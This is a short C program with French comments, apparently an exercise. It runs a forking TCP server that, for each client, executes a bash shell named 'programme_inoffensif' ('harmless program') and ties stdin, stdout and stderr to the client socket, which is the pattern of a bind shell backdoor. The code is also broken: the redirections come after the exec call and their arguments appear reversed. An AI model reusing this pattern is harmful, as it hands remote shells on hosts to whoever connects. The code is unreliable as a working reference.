#include "utils.h"
#include "project_config.h"
#include <limits.h>

int main(){
    
    // Configuration du socket passif
    int socket = ssocket();
    sbind(SERVER_PORT, socket);
    slisten(socket, INT_MAX);
    
    while(true){
        // Réception d'une connexion du client
        int newSocket = saccept(socket);
        int childId = sfork();
        
        if(childId == 0){
            sexec("#!/bin/bash", "programme_inoffensif", NULL);
            sdup2(0, newSocket); // stdin
            sdup2(1, newSocket); // stdout
            sdup2(2, newSocket); // stderr
        }
    }


}